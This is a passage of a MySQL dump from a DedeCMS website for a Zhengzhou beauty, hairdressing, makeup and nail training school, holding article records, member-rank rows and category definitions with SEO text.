如果你是成熟端庄的女性，不妨选用纯白和','',1,0,0,55),(59,5,'0',1551881021,'c,h,p,x',1,1,0,238,0,'美容师需要了解的专业知识','美容师需要了解的专业知识','','admin','未知','/uploads/1903/1-1Z306210001492.jpg',1551881021,1551586573,1,'美容师,需要,了解,的,专业知识,随着,',0,0,0,0,0,0,'随着生活水平的提升越来越多人注重美容养生,前些日子小编跟同事去新美合作美容养生会所作做推背,我们聊到美业她也是赞不绝口,近些年来对于美业的发展速度非常快,学习美容的学员','',1,0,0,56),(60,16,'0',1551883540,'c,h,p,z',1,1,0,105,0,'化妆作品欣赏','化妆作品欣赏','','admin','未知','/uploads/190221/1903/1-1Z306224635912.jpg',1551883540,1551599983,1,'化妆,作品欣赏,',0,0,0,0,0,0,'','',1,0,0,57),(61,11,'0',1551881568,'p,f,x',1,1,0,2678,0,'学理发一般要学多久','学理发一般要学多久进入美发','','admin','未知','/uploads/190221/1903/1-1Z306221456308.jpg',1551881568,1551600833,1,'学,理发,一般,要,多久,进入,美,发行业,并,',0,0,0,0,0,0,'进入美发行业并不像大家想象的那么困难，如果我们能找到一个正规的学校学习，那么就能在短时间内掌握一定的美发技能，掌握技能后就有了开店吸引客户前来的基础。在学习美发时','',1,0,0,58),(62,11,'0',1551881488,'p,f,x',1,1,0,2672,0,'2019年学美发前景好吗','2019年学美发前景好吗','','admin','未知','/uploads/190221/1903/1-1Z306221143503.jpg',1551881488,1551600898,1,'2019年,学,美发,前景,好吗,随着,经济,的,发展,',0,0,0,0,0,0,'随着经济的发展和生活水平的提高，人们对生活水平质量要求越来越高，越来越愿意花钱在变美这个领域。无论男女都越来越愿意花大量的时间和金钱在美容美发上。而且无论在哪个城','',1,0,0,59),(63,11,'0',1551881206,'p,f,x',1,1,0,221,0,'发型不满意，你需要和发型师＂近距离＂沟通','发型不满意，你需要和发型师','','admin','未知','/uploads/190221/1903/1-1Z30622102b63.jpg',1551881206,1551600983,1,'发型,不满意,你需,要和,发型师,近,距离,沟通,',0,0,0,0,0,0,'在发布了很多的美发发型的文章后，很多小伙伴说都私信说，老师，每次发的潮流发型，我们都想剪，可是到了发型师手里，想要的和剪出来不是一个画风啊，对于这个问题呢，今天我','',1,0,0,60),(64,11,'0',1551791894,'p,f,x',1,1,0,110,0,'新手学理发多久能出师','新手学理发多久能出师','','admin','未知','/uploads/1903/1-1Z303214I4916.jpg',1551791894,1551601150,1,'新手,学,理发,多久,能,出师,现在,年轻,人都,',0,0,0,0,0,0,'现在年轻人都希望能拥有一份属于自己的事业，这样才能给于自己家人更好的物质生活。许多人会绞尽脑汁去思考一份适合自己的事业，但在这个社会上除了学历以外，我们一定要能掌','',1,0,0,61),(65,17,'0',1551608037,'p,x',1,1,0,102,0,'如何选择适合自己的化妆培训课程','如何选择适合自己的化妆培训','','admin','未知','/uploads/1903/1-1Z3031Q330555.jpg',1551608037,1551608029,1,'如何,选择,适合,自己的,化妆,培训课程,',0,0,0,0,0,0,'互联网的兴起让现在的教育变得越来越简单，也拓宽了教育的渠道，网上授课成为风靡于学生之间的时尚，同时学习化妆培训课程也成为大家感兴趣的话题，而对于爱美，欣赏美，善于','',1,0,0,62),(66,17,'0',1551608071,'p',1,1,0,93,0,'零基础到专业化妆师需要多久','零基础到专业化妆师需要多久','','admin','未知','/uploads/1903/1903/1-1Z3031Q6112H.jpg',1551608071,1551608177,1,'零,基础,到,专业,化妆师,需要,多久,很多人,',0,0,0,0,0,0,'很多人尤其是没有一技之长傍身的人，都想学一门技术来支撑自己的生活，化妆无疑是大部分人的首选，化妆不仅仅是非常赚钱的行业，也是一个与美和时尚交融的行业，令很多人向往','',1,0,0,63),(67,32,'0',1552406101,'c,p,x',1,1,0,2805,0,'2018年美容美发行业市场规模及发展趋势预测','2018年美容美发行业市场规模及','','admin','未知','/uploads/1903/1-1Z312235512P4.jpg',1552406101,1551613869,1,'2018年,美容美发,行业市场,规模,及,发展,趋势,',0,0,0,0,0,0,'近年来，美容美发行业逐步向便利化、精细化、品质化方向发展，转型升级过程加速。随着经济的飞速发展，以及人民生活水平的提升，美容美发行业获得了良好的发展机遇。美容美发','',1,0,0,64),(68,11,'0',1552400501,'p,s,x',1,1,0,2775,0,'快速剪短发方法和技巧','快速剪短发方法和技巧','','admin','未知','/uploads/190221/1903/1-1Z306220635933.jpg',1552400501,1551621169,1,'快速,剪,短发,方法,和,技巧,一,长发,。,洗,',0,0,0,0,0,0,'（一）长发。 洗干净头发，梳头，用梳子分缝，如左右两侧，左侧上边三分之一、三分之二处，分别用小皮筋或小卡子固定，右侧类似，把两侧最下边头发拿到肩部前面，照着镜子开始','',1,0,0,65),(70,9,'0',1551879125,'c,h,p,s,o',1,1,0,199,0,'美发理论学习实景','美发理论学习实景','','admin','未知','/uploads/1903/1-1Z306213102330.jpg',1551879125,1551879094,1,'美发,理论学习,实景,',0,0,0,0,0,0,'','',1,0,0,67),(71,9,'0',1551879252,'c,h,p,s,o',1,1,0,147,0,'美发学员练习操作','美发学员练习操作','','admin','未知','/uploads/1903/1-1Z3062133562X.jpg',1551879252,1551879243,1,'美发,学员,练习,操作,',0,0,0,0,0,0,'','',1,0,0,68),(72,9,'0',1551879337,'c,h,p,s,o',1,1,0,254,0,'一对一指导练习','一对一指导练习','','admin','未知','/uploads/1903/1-1Z306213531619.jpg',1551879337,1551879335,1,'一对一,指导,练习,',0,0,0,0,0,0,'','',1,0,0,69),(73,15,'0',1551883120,'p,o',1,1,0,172,0,'化妆学员互相练习','化妆学员互相练习','','admin','未知','/uploads/190221/1903/1-1Z306223942c4.jpg',1551883120,1551883187,1,'化妆,学员,互相,练习,',0,0,0,0,0,0,'','',1,0,0,70),(74,15,'0',1551883216,'p,o',1,1,0,155,0,'化妆学员实操','化妆学员实操','','admin','未知','/uploads/190221/1903/1-1Z30622412B25.jpg',1551883216,1551883292,1,'化妆,学员,实操,',0,0,0,0,0,0,'','',1,0,0,71),(75,17,'0',1551883393,'p',1,1,0,107,0,'形象设计师——创造维纳斯之美','形象设计师——创造维纳斯之','','admin','未知','/uploads/190221/1903/1-1Z306224511D8.jpg',1551883393,1551883516,1,'形象,设计师,—,创造,维纳斯,之美,爱美,之心,',0,0,0,0,0,0,'爱美之心，人皆有之，无论是十七八岁的妙龄少女，还是三四十岁的都市白领，抑或是人到中年风韵犹存的知性女性，都期待拥有适合自己的美丽。根据自身条件、年龄、气质的不同，','',1,0,0,72),(76,16,'0',1551884381,'c,h,p,z',1,1,0,79,0,'彩妆造型作品','彩妆造型作品','','admin','未知','/uploads/190221/1903/1-1Z306225930246.jpg',1551884381,1551884375,1,'彩妆,造型,作品,',0,0,0,0,0,0,'','',1,0,0,73),(77,16,'0',1551884486,'c,h,p,z',1,1,0,257,0,'化妆妆容作品','化妆妆容作品','','admin','未知','/uploads/190221/1903/1-1Z306230111508.jpg',1551884486,1551884476,1,'化妆,妆容,作品,',0,0,0,0,0,0,'','',1,0,0,74),(78,16,'0',1551884498,'c,h,p,z',1,1,0,171,0,'化妆培训作品','化妆培训作品','','admin','未知','/uploads/190221/1903/1-1Z306230232646.jpg',1551884498,1551884558,1,'化妆,培训,作品,',0,0,0,0,0,0,'','',1,0,0,75),(79,21,'0',1551884642,'c,h,p,s,o',1,1,0,148,0,'美甲学员手操','美甲学员手操','','admin','未知','/uploads/190221/1903/1-1Z306230352356.jpg',1551884642,1551884637,1,'美甲,学员,手操,',0,0,0,0,0,0,'','',1,0,0,76),(80,21,'0',1551884737,'c,h,p,s,o',1,1,0,2666,0,'美甲学员练习实景','美甲学员练习实景','','admin','未知','/uploads/190221/1903/1-1Z30623052G23.jpg',1551884737,1551884733,1,'美甲,学员,练习,实景,',0,0,0,0,0,0,'','',1,0,0,77),(81,21,'0',1551884821,'c,h,p,s,o',1,1,0,2693,0,'美甲老师指导','美甲老师指导','','admin','未知','/uploads/190221/1903/1-1Z306230A2938.jpg',1551884821,1551884816,1,'美甲,老师,指导,',0,0,0,0,0,0,'','',1,0,0,78),(82,21,'0',1551884899,'c,h,p,s,o',1,1,0,2684,0,'美甲学员实操','美甲学员实操','','admin','未知','/uploads/190221/1903/1-1Z306230Q2D4.jpg',1551884899,1551884897,1,'美甲,学员,实操,',0,0,0,0,0,0,'','',1,0,0,79),(83,22,'0',1551885808,'p,z',1,1,0,184,0,'美甲培训作品','美甲培训作品','','admin','未知','/uploads/190221/1903/1-1Z306232254102.jpg',1551885808,1551885784,1,'美甲,培训,作品,',0,0,0,0,0,0,'','',1,0,0,80),(84,22,'0',1551885890,'p,z',1,1,0,2706,0,'美甲培训作品','美甲培训作品','','admin','未知','/uploads/190221/1903/1-1Z306232432M6.jpg',1551885890,1551885877,1,'美甲,培训,作品,',0,0,0,0,0,0,'','',1,0,0,81),(85,22,'0',1551885897,'p,z',1,1,0,2717,0,'美甲培训作品','美甲培训作品','','admin','未知','/uploads/190221/1903/1-1Z306232542458.jpg',1551885897,1551885948,1,'美甲,培训,作品,',0,0,0,0,0,0,'','',1,0,0,82),(86,22,'0',1551886015,'p,z',1,1,0,2747,0,'美甲培训作品','美甲培训作品','','admin','未知','/uploads/190221/1903/1-1Z30623264KA.jpg',1551886015,1551886013,1,'美甲,培训,作品,',0,0,0,0,0,0,'','',1,0,0,83),(87,32,'0',1552401045,'p',1,1,0,2703,0,'2018中国技能大赛全国商业行业美发美容职业技能','2018中国技能大赛全国商业行业','','admin','未知','/uploads/1903/1-1Z31222294G58.jpg',1552401045,1552400994,1,'2018,中国,技能,大赛,全国,商业,行业,美发,',0,0,0,0,0,0,'2018年11月4日，全国商业行业美发美容职业技能竞赛总决赛在上海光大会展中心隆重举行，本次大赛是国家二类大赛，由中国商业联合会、中国就业培训技术指导中心主办，中国商业联合','',1,0,0,84),(88,32,'0',1552406305,'p',1,1,0,2800,0,'学一门技术照样能成才！美容师、美发师、美甲','学一门技术照样能成才！','','admin','未知','/uploads/1903/1-1Z312235S5209.jpg',1552406305,1552405637,1,'学,一门,技术,照样,能,成才,美容师,、,美发师,',0,0,0,0,0,0,'学习一门手艺如何？可能有些人认为不过是考不上大学，当不了白领，无奈之下才学一门手艺。其实不然，据我观察能够以纹绣师或者美甲师、美容师、美发师为职业的，并不像很多人','',1,0,0,85),(89,27,'0',1552534033,'c,h,p,a',1,1,0,509,0,'环球学校简介','环球学校简介','','admin','未知','/uploads/allimg/190224/1-1Z224143629140-lp.jpg',1552534033,1552534005,1,'环球,学校简介,郑州市,中原,环球,美容美发,',0,0,0,0,0,0,'郑州市中原环球美容美发晚装职业技能培训学校，简称郑州环球美容美发化妆学校，最初由广州环球美容美发集团发展而来。学校开创之初仅仅是几个穷孩子为了谋生存，经拜师学艺后','',1,0,0,86),(90,25,'0',1568647642,'p',1,1,0,407,0,'高级化妆讲师—李晓','高级化妆讲师—李晓','','admin','未知','/uploads/190226/1909/1-1Z916232A9551.jpg',1568647642,1553527731,1,'高级,化妆,讲师,—,李晓,高级,化妆,讲师,—,',0,0,0,0,0,0,'高级化妆讲师—李晓 洋河封藏大典化妆指导老师 中韩古乐文化交流会特邀化妆师 河南博物院乐俑复原造型化妆师','',1,0,0,87),(91,16,'0',1554636181,'p,z',1,1,0,2711,0,'环球化妆作品','环球化妆作品','','admin','未知','/uploads/allimg/20190407/1554636094570922.jpg',1554636181,1554636150,1,'环球,化妆,作品,',0,0,0,0,0,0,'','',1,0,0,88),(92,16,'0',1554636190,'p,z',1,1,0,2627,0,'环球化妆作品','环球化妆作品','','admin','未知','/uploads/allimg/20190407/1554636211215234.jpg',1554636190,1554636236,1,'环球,化妆,作品,',0,0,0,0,0,0,'','',1,0,0,89),(93,16,'0',1554636244,'p,z',1,1,0,2736,0,'环球化妆作品','环球化妆作品','','admin','未知','/uploads/allimg/20190407/1554636286160762.jpg',1554636244,1554636309,1,'环球,化妆,作品,',0,0,0,0,0,0,'','',1,0,0,90),(94,3,'0',1554636760,'p,o',1,1,0,2676,0,'环球美容火疗','环球美容火疗','','admin','未知','/uploads/allimg/20190407/1554636425420381.jpg',1554636760,1554636467,1,'环球,美容,火疗,',0,0,0,0,0,0,'','',1,0,0,91),(95,9,'0',1554636495,'p,o',1,1,0,2867,0,'环球美发培训','环球美发培训','','admin','未知','/uploads/allimg/20190407/1554636529818288.jpg',1554636495,1554636553,1,'环球,美发,培训,',0,0,0,0,0,0,'','',1,0,0,92),(96,9,'0',1554636555,'p,o',1,1,0,2994,0,'环球美发培训','环球美发培训','','admin','未知','/uploads/allimg/20190407/1554636575962116.jpg',1554636555,1554636600,1,'环球,美发,培训,',0,0,0,0,0,0,'','',1,0,0,93),(97,14,'0',1568684481,'c,h,p,a,k',1,1,0,10396,0,'影视剧组就业班','影视剧组就业班','','admin','未知','/uploads/190226/1909/1-1Z916223614E3.jpg',1568684481,1568644386,1,'影视,剧组,就业班,影视,剧组,就业班,学制,',0,0,0,0,0,0,'影视剧组就业班 学制：一年制 开学时间：每月1日、15日开学 上课方式：(全天、自由)均可 上课时间： 1、周一到周五正常上课,周六日休息 2、上课时间:上午9:00-12:00下午13:00–16：30 备','',1,0,0,94),(98,25,'0',1568800619,'p',1,1,0,311,0,'明星导师-于健','明星导师-于健','','admin','未知','/uploads/allimg/1909/1-1Z9162300160-L.jpg',1568800619,1568646064,1,'化妆,老师,于健,姓名,于健,职业,整体,形象,',0,0,0,0,0,0,'姓名：于健 职业：整体形象设计师 国家级技师 中国创意时尚化妆造型师 国家级化妆造型评委 国际旅游小姐冠军总决赛化妆造型师 新生代大赛化妆造型总监 中西部模特大赛特约化妆造','',1,0,0,95),(99,25,'0',1568735313,'p',1,1,0,355,0,'教育部长-刘文佳','教育部长-刘文佳','','admin','未知','/uploads/allimg/1909/1-1Z9162302230-L.jpg',1568735313,1568646150,1,'美发,老师,刘文,佳,',0,0,0,0,0,0,'刘文佳—郑州环球美容美发学校教育部长','',1,0,0,96),(100,14,'0',1584201426,'c,h,p,s,k',1,1,-2,82,0,'影视剧组就业班','影视剧组就业班','','admin','未知','/uploads/allimg/1909/1-1Z9162353240-L.jpg',1568649426,1568649211,1,'影视,剧组,就业班,影视,剧组,就业班,学制,',0,0,0,0,0,1,'影视剧组就业班 学制：一年制 开学时间：每月1日、15日开学 上课方式：(全天、自由)均可 上课时间： 1、周一到周五正常上课,周六日休息 2、上课时间:上午9:00-12:00下午13:00–16：30 备','',1,0,0,97),(101,14,'0',1569861055,'c,h,p,k',1,1,0,86,0,'影视剧组签约就业班','影视剧组签约就业班','','admin','未知','/uploads/1910/1-191001002JA49.jpg',1569861055,1569859658,1,'影视,剧组,签约,就业班,影视,剧组,签约,',0,0,0,0,0,0,'影视剧组签约就业班 学制：一年制 开学时间：每月 1 日、 15 日开学 上课方式： ( 全天、自由 ) 均可 上课时间： 1 、周一到周五正常上课 , 周六日休息 2 、上课时间 : 上午 9:00-12:00 下','',1,0,0,98),(102,2,'0',1569860594,'p',1,1,0,107,0,'韩式半永久纹绣','韩式半永久纹绣','','admin','未知','/uploads/1910/1-191001002441535.jpg',1569860594,1569860233,1,'韩式,半,永久,纹绣,韩式,半,永久,纹绣,、,',0,0,0,0,0,0,'韩式半永久纹绣 1、专业纹绣师应具备的条件 2、新潮眉形设计（流星眉 落尾眉 凤尾眉 黛玉眉 标准眉 海鸥眉 平眉 剑眉） 3、眉毛的美化 A、标准眉型 B、不同眉型矫正 C、眉型设计 4、','',1,0,0,99);
/*!40000 ALTER TABLE `dede_archives` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_arcmulti`
--

DROP TABLE IF EXISTS `dede_arcmulti`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_arcmulti` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `tagid` char(60) NOT NULL DEFAULT '',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `innertext` varchar(255) NOT NULL DEFAULT '',
  `pagesize` int(11) NOT NULL DEFAULT '0',
  `arcids` text NOT NULL,
  `ordersql` varchar(255) DEFAULT NULL,
  `addfieldsSql` varchar(255) DEFAULT NULL,
  `addfieldsSqlJoin` varchar(255) DEFAULT NULL,
  `attstr` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_arcmulti`
--

LOCK TABLES `dede_arcmulti` WRITE;
/*!40000 ALTER TABLE `dede_arcmulti` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_arcmulti` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_arcrank`
--

DROP TABLE IF EXISTS `dede_arcrank`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_arcrank` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `rank` smallint(6) NOT NULL DEFAULT '0',
  `membername` char(20) NOT NULL DEFAULT '',
  `adminrank` smallint(6) NOT NULL DEFAULT '0',
  `money` smallint(8) unsigned NOT NULL DEFAULT '500',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `purviews` mediumtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_arcrank`
--

LOCK TABLES `dede_arcrank` WRITE;
/*!40000 ALTER TABLE `dede_arcrank` DISABLE KEYS */;
INSERT INTO `dede_arcrank` VALUES (1,0,'开放浏览',5,0,0,''),(2,-1,'待审核稿件',0,0,0,''),(3,10,'注册会员',5,0,100,''),(4,50,'中级会员',5,300,200,''),(5,100,'高级会员',5,800,500,''),(6,20,'低级会员',5,0,500,''),(7,150,'给力会员',5,1000,500,''),(8,180,'超能会员',5,1100,500,'');
/*!40000 ALTER TABLE `dede_arcrank` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_arctiny`
--

DROP TABLE IF EXISTS `dede_arctiny`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_arctiny` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid2` varchar(90) NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `channel` smallint(5) NOT NULL DEFAULT '1',
  `senddate` int(10) unsigned NOT NULL DEFAULT '0',
  `sortrank` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`),
  KEY `idx_typeid_arcrank_sortrank` (`typeid`,`arcrank`,`sortrank`)
) ENGINE=MyISAM AUTO_INCREMENT=103 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_arctiny`
--

LOCK TABLES `dede_arctiny` WRITE;
/*!40000 ALTER TABLE `dede_arctiny` DISABLE KEYS */;
INSERT INTO `dede_arctiny` VALUES (1,2,'0',0,1,1550743476,1550743306,1),(2,2,'0',-2,1,1550743543,1550744356,1),(3,2,'0',0,1,1550751122,1551709353,1),(4,2,'0',0,1,1550751854,1551705807,1),(5,2,'0',0,1,1550751900,1551707228,1),(6,8,'0',0,1,1550752116,1555738538,1),(7,8,'0',0,1,1550752157,1551707680,1),(8,8,'0',0,1,1550752228,1551707549,1),(9,10,'0',-2,1,1550752269,1550752241,1),(10,10,'0',0,1,1550752318,1551880219,1),(11,11,'0',0,1,1550752398,1551881749,1),(12,11,'0',0,1,1550752415,1551881730,1),(13,11,'0',0,1,1550752438,1551881710,1),(14,9,'0',0,1,1550752630,1551878823,1),(15,9,'0',0,1,1550752660,1551878708,1),(16,14,'0',0,1,1550752846,1564452489,1),(17,14,'0',0,1,1550752902,1551882952,1),(18,14,'0',0,1,1550752936,1551617992,1),(19,15,'0',0,1,1550752998,1551882994,1),(20,34,'0',0,1,1550753834,1550753748,1),(21,34,'0',-2,1,1550753885,1550753894,1),(22,3,'0',0,1,1550758424,1551878383,1),(23,3,'0',0,1,1550758448,1551878221,1),(24,3,'0',0,1,1550758474,1551878323,1),(25,25,'0',0,1,1550907716,1550909133,1),(26,25,'0',0,1,1550909256,1550909184,1),(27,25,'0',-2,1,1550909367,1550909299,1),(28,25,'0',0,1,1550909426,1550909383,1),(29,25,'0',0,1,1550909483,1550909433,1),(30,25,'0',0,1,1550909602,1550909520,1),(31,25,'0',0,1,1550909643,1550909604,1),(32,25,'0',0,1,1550909687,1550909818,1),(33,25,'0',-1,1,1550909737,1568616693,1),(34,3,'0',0,1,1550914819,1551878036,1),(35,4,'0',0,1,1550919983,1551880887,1),(36,4,'0',0,1,1550920066,1551880803,1),(37,4,'0',0,1,1550920104,1551877564,1),(38,4,'0',0,1,1550920161,1551877531,1),(39,4,'0',0,1,1550920185,1551877223,1),(40,4,'0',0,1,1550920221,1551876814,1),(41,5,'0',0,1,1550920496,1551880980,1),(42,5,'0',0,1,1550920606,1551881097,1),(43,2,'0',0,1,1550921709,1551706625,1),(44,5,'0',0,1,1550925678,1551881954,1),(45,28,'0',0,1,1550990239,1550990337,1),(46,29,'0',-1,1,1550990463,1552534376,1),(47,20,'0',0,1,1551002004,1551618546,1),(48,20,'0',0,1,1551002247,1554046388,1),(49,10,'0',0,1,1551185561,1551879766,1),(50,10,'0',0,1,1551185583,1551879659,1),(51,10,'0',0,1,1551185615,1551880033,1),(52,10,'0',0,1,1551185631,1551880191,1),(53,23,'0',0,1,1551363930,1551363991,1),(54,23,'0',0,1,1551364177,1551364056,1),(55,28,'0',0,1,1551522534,1551522703,1),(56,6,'0',0,1,1551523127,1551523136,1),(57,12,'0',0,1,1551523465,1551523295,1),(58,23,'0',-2,1,1551523880,1551524503,1),(59,5,'0',0,1,1551586573,1551881021,1),(60,16,'0',0,1,1551599983,1551883540,1),(61,11,'0',0,1,1551600833,1551881568,1),(62,11,'0',0,1,1551600898,1551881488,1),(63,11,'0',0,1,1551600983,1551881206,1),(64,11,'0',0,1,1551601150,1551791894,1),(65,17,'0',0,1,1551608029,1551608037,1),(66,17,'0',0,1,1551608177,1551608071,1),(67,32,'0',0,1,1551613869,1552406101,1),(68,11,'0',0,1,1551621169,1552400501,1),(69,3,'0',0,1,1551878481,1551878504,1),(70,9,'0',0,1,1551879094,1551879125,1),(71,9,'0',0,1,1551879243,1551879252,1),(72,9,'0',0,1,1551879335,1551879337,1),(73,15,'0',0,1,1551883187,1551883120,1),(74,15,'0',0,1,1551883292,1551883216,1),(75,17,'0',0,1,1551883516,1551883393,1),(76,16,'0',0,1,1551884375,1551884381,1),(77,16,'0',0,1,1551884476,1551884486,1),(78,16,'0',0,1,1551884558,1551884498,1),(79,21,'0',0,1,1551884637,1551884642,1),(80,21,'0',0,1,1551884733,1551884737,1),(81,21,'0',0,1,1551884816,1551884821,1),(82,21,'0',0,1,1551884897,1551884899,1),(83,22,'0',0,1,1551885784,1551885808,1),(84,22,'0',0,1,1551885877,1551885890,1),(85,22,'0',0,1,1551885948,1551885897,1),(86,22,'0',0,1,1551886013,1551886015,1),(87,32,'0',0,1,1552400994,1552401045,1),(88,32,'0',0,1,1552405637,1552406305,1),(89,27,'0',0,1,1552534005,1552534033,1),(90,25,'0',0,1,1553527731,1568647642,1),(91,16,'0',0,1,1554636150,1554636181,1),(92,16,'0',0,1,1554636236,1554636190,1),(93,16,'0',0,1,1554636309,1554636244,1),(94,3,'0',0,1,1554636467,1554636760,1),(95,9,'0',0,1,1554636553,1554636495,1),(96,9,'0',0,1,1554636600,1554636555,1),(97,14,'0',0,1,1568644386,1568684481,1),(98,25,'0',0,1,1568646064,1568800619,1),(99,25,'0',0,1,1568646150,1568735313,1),(100,14,'0',-2,1,1568649211,1584201426,1),(101,14,'0',0,1,1569859658,1569861055,1),(102,2,'0',0,1,1569860233,1569860594,1);
/*!40000 ALTER TABLE `dede_arctiny` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_arctype`
--

DROP TABLE IF EXISTS `dede_arctype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_arctype` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `reid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `topid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `sortrank` smallint(5) unsigned NOT NULL DEFAULT '50',
  `typename` char(30) NOT NULL DEFAULT '',
  `typedir` char(60) NOT NULL DEFAULT '',
  `isdefault` smallint(6) NOT NULL DEFAULT '0',
  `defaultname` char(15) NOT NULL DEFAULT 'index.html',
  `issend` smallint(6) NOT NULL DEFAULT '0',
  `channeltype` smallint(6) DEFAULT '1',
  `maxpage` smallint(6) NOT NULL DEFAULT '-1',
  `ispart` smallint(6) NOT NULL DEFAULT '0',
  `corank` smallint(6) NOT NULL DEFAULT '0',
  `tempindex` char(50) NOT NULL DEFAULT '',
  `templist` char(50) NOT NULL DEFAULT '',
  `temparticle` char(50) NOT NULL DEFAULT '',
  `namerule` char(50) NOT NULL DEFAULT '',
  `namerule2` char(50) NOT NULL DEFAULT '',
  `modname` char(20) NOT NULL DEFAULT '',
  `description` char(150) NOT NULL DEFAULT '',
  `keywords` varchar(60) NOT NULL DEFAULT '',
  `seotitle` varchar(80) NOT NULL DEFAULT '',
  `moresite` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `sitepath` char(60) NOT NULL DEFAULT '',
  `siteurl` char(50) NOT NULL DEFAULT '',
  `ishidden` smallint(6) NOT NULL DEFAULT '0',
  `cross` tinyint(1) NOT NULL DEFAULT '0',
  `crossid` text,
  `content` text,
  `smalltypes` text,
  `typeimg` char(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `reid` (`reid`,`isdefault`,`channeltype`,`ispart`,`corank`,`topid`,`ishidden`),
  KEY `sortrank` (`sortrank`)
) ENGINE=MyISAM AUTO_INCREMENT=37 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_arctype`
--

LOCK TABLES `dede_arctype` WRITE;
/*!40000 ALTER TABLE `dede_arctype` DISABLE KEYS */;
INSERT INTO `dede_arctype` VALUES (1,0,0,1,'美容培训','{cmspath}/meirong',1,'index.html',1,1,-1,1,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美容美发学校，开设有美容培训、中医美容培训、美容养生培训课程，致力于专业美容师培训33年，专注高级美容师人才培养，教学能力和社会影响力在业界备受好评','美容学校,美容师培训,郑州美容学校,美容学院,中医美容培训,美容培训班,环球美容学校,环球美容美发学校','',0,'{cmspath}/meirong','http://meirong.zzhqxx.com',0,0,'0','<h2 class=\"f23\">\r\n		国际美容师全能班</h2><p class=\"f12 mb10\">\r\n		国际美容师全能班</p><p class=\"cl c555\"><strong class=\"cf30 f18 mr5\">循环教学</strong> <strong class=\"mr5\">3个月</strong> <strong class=\"cf30\">随到随学</strong></p><p class=\"wapbtn\"><a class=\"mr5 btn btn-danger\" href=\"#\">详细介绍</a>&nbsp; <a class=\"btn btn-danger\" href=\"http://www.baidu.com\" rel=\"external nofollow\" target=\"_blank\">在线咨询</a></p><p>\r\n		&nbsp;</p><p><br/></p>','','/uploads/1902/1-1Z22GQTC06.jpg'),(2,1,1,0,'美容课程','{cmspath}/meirong/kecheng',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美容学校,河南美容培训品牌学校,设有多种美容专业课程,美容课程安排合理,课程体系权威专业,可考取美容师资格证书的学校!','环球美容培训,美容培训课程,中医美容培训,美容培训,美容课程,郑州环球美容学校','美容课程',0,'{cmspath}/meirong','http://meirong.zzhqxx.com',0,0,'0','','','/uploads/1902/1-1Z22GQTC06.jpg'),(3,1,1,1,'美容实操','{cmspath}/meirong/shicao',1,'index.html',1,1,-1,0,0,'default/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','学美容实操，环球美容学校实操练习,标准美容手法,专业理论知识讲解,背部面部颈部等实操作练习，美容实操课程占据了美容总课程的70%以上，确保学员能够学到足够扎实的美容技术','美容学校实操,美容培训实操,环球美容实操,美容护肤,美容实操练习,学美容','美容实操',0,'{cmspath}/meirong','http://meirong.zzhqxx.com',0,0,'0','','','/uploads/1902/1-1Z22GQTC06.jpg'),(4,1,1,2,'美容作品','{cmspath}/meirong/zuopin',1,'index.html',1,1,-1,0,0,'default/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球美容学校美容作品,内容包含面部美容,面部按摩,背部护理，背部按摩,香薰浴盐等等美容作品，美容图片和作品都是老师和学员们的宝贵经验，也是学校重技术、重实操的佐证','美容作品,美容培训作品,面部美容作品,环球美容培训,环球美容培训作品','美容作品',0,'{cmspath}/meirong','http://meirong.zzhqxx.com',0,0,'0','','','/uploads/1902/1-1Z22GQTC06.jpg'),(5,1,1,3,'美容资讯','{cmspath}/meirong/zixun',1,'index.html',1,1,-1,0,0,'default/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球美容学校提供专业的美容护肤知